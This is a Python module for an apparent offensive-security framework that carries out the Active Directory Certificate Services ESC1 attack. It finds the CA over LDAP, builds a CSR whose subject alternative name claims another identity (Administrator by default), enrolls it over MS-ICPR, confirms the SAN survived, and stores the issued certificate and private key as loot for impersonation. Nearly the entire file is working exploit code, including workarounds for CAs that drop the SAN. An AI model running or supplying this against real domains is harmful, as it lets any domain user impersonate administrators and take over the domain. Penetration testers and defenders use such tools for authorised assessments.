"""ESC1: enrollee-supplied-SAN certificate enrollment over MS-ICPR.

The template config that breaks domains: a template allows client auth
AND lets the requestor pick the subject (CT_FLAG_ENROLLEE_SUPPLIES_
SUBJECT). Any domain user can then ask the CA for a certificate FOR
ANYONE — Administrator included — and the CA signs it. That cert is an
authentication identity: client-auth to services, PKINIT for a TGT.

This module does the full ESC1 chain:

  1. discovers the CA over LDAP (pKIEnrollmentService in the config NC —
     name, host, published templates)
  2. builds an RSA key + CSR locally (the requestor's CN is ours; the
     impersonation lives in the SAN we attach)
  3. asks the CA over MS-ICPR (the cert pipe) for TEMPLATE — the SAN
     rides both as the SAN:upn request attribute AND inside the CSR as
     a UPN OtherName extension (CAs can silently drop the attribute),
     then verifies the SAN made it into the issued cert
  4. loot: PEM cert + PEM key, ready for PKINIT or client auth

Detect the shape first with auxiliary/enum/adcs_enum (ESC1 flag).
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptInt, OptPort, OptString

try:
    from impacket.dcerpc.v5 import icpr, rpcrt, transport
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from impacket.smbconnection import SMBConnection
except ImportError:
    icpr = None  # console gates run() on requirements
try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
except ImportError:
    x509 = None

DISPOSITION_ISSUED = 3
DISPOSITION_PENDING = 5


UPN_OTHERNAME_OID = "1.3.6.1.4.1.311.20.2.3"


def _der_utf8(value):
    """DER-encode a UTF8String (the body of an OtherName SAN value)."""
    raw = value.encode("utf-8")
    if len(raw) >= 128:
        raise ValueError("SAN too long for short-form DER")
    return b"\x0c" + bytes([len(raw)]) + raw


def build_csr(cn, key_size, san=None):
    """(csr_der, key_pem) — a fresh RSA key + CSR for CN=`cn`.

    The SAN rides INSIDE the CSR as a UPN OtherName extension, not only
    as the SAN:upn request attribute: the CA's policy module can drop
    the attribute silently (observed against the lab's Server 2022 —
    issued cert had no SAN at all), while the CSR extension is part of
    what an enrollee-supplies-subject template honors."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=key_size)
    builder = x509.CertificateSigningRequestBuilder().subject_name(
        x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
    if san:
        other = x509.OtherName(x509.ObjectIdentifier(UPN_OTHERNAME_OID),
                               _der_utf8(san))
        builder = builder.add_extension(
            x509.SubjectAlternativeName([other]), critical=False)
    csr = builder.sign(key, hashes.SHA256())
    key_pem = key.private_bytes(serialization.Encoding.PEM,
                                serialization.PrivateFormat.PKCS8,
                                serialization.NoEncryption())
    return csr.public_bytes(serialization.Encoding.DER), key_pem


def der_to_pem_cert(der):
    import base64
    body = base64.b64encode(der).decode()
    lines = "\n".join(body[i:i + 64] for i in range(0, len(body), 64))
    return f"-----BEGIN CERTIFICATE-----\n{lines}\n-----END CERTIFICATE-----\n"


def san_in_cert(cert_der, upn):
    """True when the issued cert really carries `upn` as a UPN SAN.
    The CA can accept a request and silently drop the SAN — never claim
    the win without checking (the lab's Server 2022 did exactly that)."""
    try:
        cert = x509.load_der_x509_certificate(cert_der)
        san = cert.extensions.get_extension_for_class(
            x509.SubjectAlternativeName).value
        for name in san:
            if isinstance(name, x509.OtherName) and \
                    name.type_id.dotted_string == UPN_OTHERNAME_OID and \
                    name.value == _der_utf8(upn):
                return True
    except Exception:
        pass
    return False


def _resolve(name, dns_server, port=53, timeout=5.0):
    """Resolve name -> IPv4 via a DNS server we DO control (the DC).
    The CA's dNSHostName lives in the lab's DNS, not the host resolver.
    Compact wire-DNS query — same shape as dns_recon's."""
    import random
    import socket
    import struct

    def enc_name(n):
        out = b""
        for label in n.strip(".").split("."):
            out += bytes([len(label)]) + label.encode()
        return out + b"\x00"

    qid = random.randint(0, 0xFFFF)
    packet = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0) + \
        enc_name(name) + struct.pack("!HH", 1, 1)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(packet, (dns_server, port))
        data, _ = sock.recvfrom(4096)

    def skip_name(pos):
        while True:
            ln = data[pos]
            if ln == 0:
                return pos + 1
            if ln & 0xC0:
                return pos + 2
            pos += 1 + ln

    qd = struct.unpack("!H", data[4:6])[0]
    an = struct.unpack("!H", data[6:8])[0]
    pos = 12
    for _ in range(qd):
        pos = skip_name(pos) + 4
    for _ in range(an):
        pos = skip_name(pos)
        rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", data[pos:pos + 10])
        pos += 10
        if rtype == 1 and rdlen == 4:
            return ".".join(str(b) for b in data[pos:pos + 4])
        pos += rdlen
    return None


def config_base(domain):
    parts = ",".join(f"DC={p}" for p in domain.split("."))
    return f"CN=Configuration,{parts}"


class Esc1(AuxiliaryModule):
    name = "ESC1 Cert Request (enrollee-supplied SAN)"
    description = """
        Requests a certificate from an AD CS CA for ANY identity (SAN
        option, default Administrator) using a template that allows
        enrollee-supplied subjects (find them with adcs_enum). The CA
        discovers itself over LDAP; enrollment goes over MS-ICPR to the
        cert pipe on the CA host. PEM cert + key land in loot — feed
        them to client-auth or a PKINIT module.
    """
    authors = ["you"]
    requirements = ["impacket", "cryptography"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller (LDAP)"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Any domain user"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))
        self.options.add(OptString("TEMPLATE", default="VulnWeb",
                                   description="ESC1-shaped template name"))
        self.options.add(OptString("SAN", default="",
                                   description="Subject Alt Name (UPN) to claim "
                                               "(default: Administrator@DOMAIN)"))
        self.options.add(OptString("CA_HOST", default="",
                                   description="CA server override (blank = from LDAP)"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port on the CA host"))
        self.options.add(OptInt("DNSPORT", default=53,
                                description="DNS port on the DC (CA name "
                                            "resolution; 15353 on the lab)"))
        self.options.add(OptInt("KEYSIZE", default=2048,
                                description="RSA key size"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        template = str(self.get_option("TEMPLATE"))
        san = str(self.get_option("SAN") or "").strip() \
            or f"Administrator@{domain}"

        ca = self._find_ca(host, domain, user, password, template)
        if ca is None:
            return
        ca_name, ca_host = ca
        self.print_status(f"CA: {ca_name} @ {ca_host}")

        ca_host = str(self.get_option("CA_HOST") or "").strip() or ca_host
        # the CA's dNSHostName resolves in the DOMAIN's DNS, which the
        # host resolver may not see (the lab's case) — resolve via the DC
        if not ca_host.replace(".", "").isdigit():
            ip = None
            try:
                ip = _resolve(ca_host, host, int(self.get_option("DNSPORT")))
            except Exception as e:
                self.print_debug(f"CA name resolution failed: {e}")
            if ip:
                self.print_debug(f"{ca_host} -> {ip}")
                ca_host = ip
        csr, key_pem = build_csr(user, int(self.get_option("KEYSIZE")), san)
        self.print_status(f"requesting {template} with SAN {san}")
        cert_der = self._enroll(ca_host, ca_name, user, password, domain,
                                csr, template, san)
        if cert_der is None:
            return
        cert_pem = der_to_pem_cert(cert_der)
        if not san_in_cert(cert_der, san):
            self.print_error(
                f"{ca_name} issued a cert but DROPPED the SAN — this is "
                f"a cert for {user}, not {san}. The template is not "
                f"honouring enrollee-supplied subjects.")
            return
        self.print_good(f"cert issued for {san} "
                        f"({len(cert_der)} bytes DER)")
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot("cert", f"esc1 {san} @ {ca_name}",
                           cert_pem + key_pem.decode(), address=host)
            self.print_status("cert+key saved as loot (PEM)")

    def _find_ca(self, host, domain, user, password, template):
        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return None
        base = ("CN=Enrollment Services,CN=Public Key Services,"
                f"CN=Services,{config_base(domain)}")
        cas = []
        try:
            for packet in conn.search(
                    searchBase=base,
                    searchFilter="(objectClass=pKIEnrollmentService)",
                    attributes=["cn", "dNSHostName",
                                "certificateTemplates"]):
                if not isinstance(packet, ldapasn1.SearchResultEntry):
                    continue
                attrs = {str(a["type"]): [str(v) for v in a["vals"]]
                         for a in packet["attributes"]}
                name = attrs.get("cn", [""])[0]
                dns = attrs.get("dNSHostName", [""])[0]
                templates = attrs.get("certificateTemplates", [])
                cas.append((name, dns, templates))
        finally:
            try:
                conn.close()
            except Exception:
                pass
        if not cas:
            self.print_error(f"{host}: no enrollment services in the "
                             f"config NC — no AD CS on this domain")
            return None
        for name, dns, templates in cas:
            marker = " (publishes our template)" if template in templates else ""
            self.print_status(f"found CA: {name} @ {dns}{marker}")
        return (cas[0][0], cas[0][1])

    def _enroll(self, ca_host, ca_name, user, password, domain, csr,
                template, san):
        port = int(self.get_option("RPORT"))
        try:
            conn = SMBConnection(ca_host, ca_host, sess_port=port,
                                 timeout=20)
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{ca_host}: SMB login to the CA failed - {e}")
            return None
        try:
            rpctrans = transport.SMBTransport(ca_host, filename=r"\cert",
                                              smb_connection=conn)
            dce = rpctrans.get_dce_rpc()
            # Server 2022's cert pipe rejects unauthenticated bindings
            # (Win32 1746) — packet privacy + explicit creds are required
            # even though the SMB session underneath is authenticated.
            dce.set_credentials(user, password, domain)
            dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(icpr.MSRPC_UUID_ICPR)
            self.print_debug("ICPR bound; submitting CSR")
            # direct dce.request, NOT hCertServerRequest: the helper
            # returns only the cert blob and logs the disposition — the
            # response carries the CA's real denial reason.
            attribs = ("\n".join(
                [f"CertificateTemplate:{template}", f"SAN:upn={san}"])
                + "\x00").encode("utf-16-le")
            pctb_attribs = icpr.CERTTRANSBLOB()
            pctb_attribs["cb"] = len(attribs)
            pctb_attribs["pb"] = attribs
            pctb_request = icpr.CERTTRANSBLOB()
            pctb_request["cb"] = len(csr)
            pctb_request["pb"] = csr
            request = icpr.CertServerRequest()
            request["dwFlags"] = 0
            request["pwszAuthority"] = ca_name + "\x00"
            request["pdwRequestId"] = 0
            request["pctbAttribs"] = pctb_attribs
            request["pctbRequest"] = pctb_request
            response = dce.request(request)
            disposition = response["pdwDisposition"]
            request_id = response["pdwRequestId"]
            if disposition != DISPOSITION_ISSUED:
                message = b"".join(
                    response["pctbDispositionMessage"]["pb"])
                text = (message.decode("utf-16-le", "replace")
                        .strip("\x00").strip())
                if disposition == DISPOSITION_PENDING:
                    self.print_error(
                        f"{ca_name}: request {request_id} PENDING manager "
                        f"approval — msPKI-Enrollment-Flag has "
                        f"CT_FLAG_PEND_ALL_REQUESTS set on {template}")
                else:
                    self.print_error(
                        f"{ca_name}: request denied "
                        f"(disposition {disposition}): {text[:200]}")
                return None
            self.print_debug(f"request id {request_id}")
            dce.disconnect()
            return b"".join(response["pctbEncodedCert"]["pb"])
        except Exception as e:
            self.print_error(f"{ca_host}: enrollment failed - {e}")
            return None
        finally:
            conn.close()
